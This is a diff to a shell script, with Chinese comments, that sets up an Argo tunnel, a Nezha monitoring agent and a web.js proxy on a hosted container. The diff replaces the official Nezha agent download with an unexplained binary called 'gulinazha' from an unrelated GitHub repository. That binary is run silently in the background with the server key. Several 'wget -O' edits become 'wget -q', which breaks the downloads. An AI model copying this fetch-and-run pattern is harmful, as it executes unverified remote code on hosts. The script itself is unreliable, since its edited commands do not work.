@@ -262,7 +262,7 @@ check_run() {
 
 # 下载并运行 Argo
 check_file() {
-  [ ! -e cloudflared ] && wget -O cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cloudflared
+  [ ! -e cloudflared ] && wget -q cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cloudflared
 }
 
 run() {
@@ -360,7 +360,7 @@ TLS=${NEZHA_TLS:+'--tls'}
 
 # 检测是否已运行
 check_run() {
-  [[ \$(pgrep -lafx nezha-agent) ]] && echo "哪吒客户端正在运行中" && exit
+  [[ \$(pgrep -lafx gulinazha) ]] && echo "哪吒客户端正在运行中" && exit
 }
 
 # 三个变量不全则不安装哪吒客户端
@@ -370,17 +370,15 @@ check_variable() {
 
 # 下载最新版本 Nezha Agent
 download_agent() {
-  if [ ! -e nezha-agent ]; then
-    URL=\$(wget -qO- -4 "https://api.github.com/repos/naiba/nezha/releases/latest" | grep -o "https.*linux_amd64.zip")
-    URL=\${URL:-https://github.com/naiba/nezha/releases/download/v0.14.11/nezha-agent_linux_amd64.zip}
-    wget \${URL}
-    unzip -qod ./ nezha-agent_linux_amd64.zip && rm -f nezha-agent_linux_amd64.zip
+  if [ ! -e gulinazha ]; then
+    URL=\${URL:-https://github.com/dsadsadsss/d/releases/download/sd/gulinazha}
+    wget -q gulinazha \${URL}
   fi
 }
 
 # 运行 Nezha 客户端
 run() {
-  [ -e nezha-agent ] && nohup ./nezha-agent -s \${NEZHA_SERVER}:\${NEZHA_PORT} -p \${NEZHA_KEY} \${TLS} >/dev/null 2>&1 &
+  [ -e gulinazha ] && nohup ./gulinazha -s \${NEZHA_SERVER}:\${NEZHA_PORT} -p \${NEZHA_KEY} \${TLS} >/dev/null 2>&1 &
 }
 
 check_run
@@ -404,7 +402,7 @@ download_web() {
   if [ ! -e web.js ]; then
 # 建议改为自编译的内置配置的文件
     URL=\${URL:-https://github.com/fscarmen2/Argo-X-Container-PaaS/raw/main/files/web.js}
-    wget -O web.js \${URL}
+    wget -q web.js \${URL}
   fi
 }
 # 运行 web.js
@@ -422,11 +420,14 @@ generate_config
 generate_argo
 generate_nezha
 generate_web
+
 [ -e nezha.sh ] && bash nezha.sh
 sleep 3
 [ -e argo.sh ] && bash argo.sh
 sleep 3
 [ -e web.sh ] && bash web.sh
+
+
 while true; do
 
 echo "app is running"
